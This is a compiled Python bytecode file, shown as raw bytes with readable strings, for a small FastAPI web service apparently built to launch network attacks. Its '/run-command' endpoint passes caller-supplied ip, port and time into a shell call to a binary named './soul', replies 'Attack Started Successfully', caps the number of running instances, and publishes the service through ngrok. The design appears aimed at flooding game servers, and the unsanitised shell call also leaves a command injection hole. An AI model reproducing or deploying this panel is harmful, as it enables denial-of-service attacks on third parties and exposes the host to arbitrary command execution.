U
    wb�f�  �                   @   s�   d dl mZ d dlZd dlZd dlZe� Ze�d�eeed�dd��Z	dd� Z
ed	kr�d dlZd dlZd dlZd
d� Zejed���  ejeddd� dS )�    )�FastAPINz/run-command)�ip�port�timec              
   �   s�   d| � d|� d|� d�}d}t �dddg�D ]2}|jd dksVd|jkr,d|jd kr,|d	7 }q,|d
krrddd�S z0tj|dd�}t�t||�� dd| ||d�W S  tk
r� } zdt	|�d� W Y �S d }~X Y nX d S )Nz./soul � z 200r   �pid�nameZcmdlineZbgmi�   �   Tz/Maximum number of instances are already running)�error�output)�shellFzAttack Started Successfully)r   r   r   r   r   )
�psutilZprocess_iter�info�
subprocess�Popen�asyncioZcreate_task�stop_process_after_time�	Exception�str)r   r   r   ZcommandZinstance_count�processZrunning_process�e� r   �new.py�run_command   s    &

r   c                 �   s   t �|�I d H  | ��  d S )N)r   �sleepZ	terminate)r   r   r   r   r   r      s    r   �__main__c                   C   s   t �d� d S )Nzngrok http 8000)�os�systemr   r   r   r   �	run_ngrok   s    r   )�targetz0.0.0.0i@  )Zhostr   )Zfastapir   r   r   r   Zapp�getr   �intr   r   �__name__Zuvicornr   �	threadingr   �Thread�start�runr   r   r   r   �<module>   s   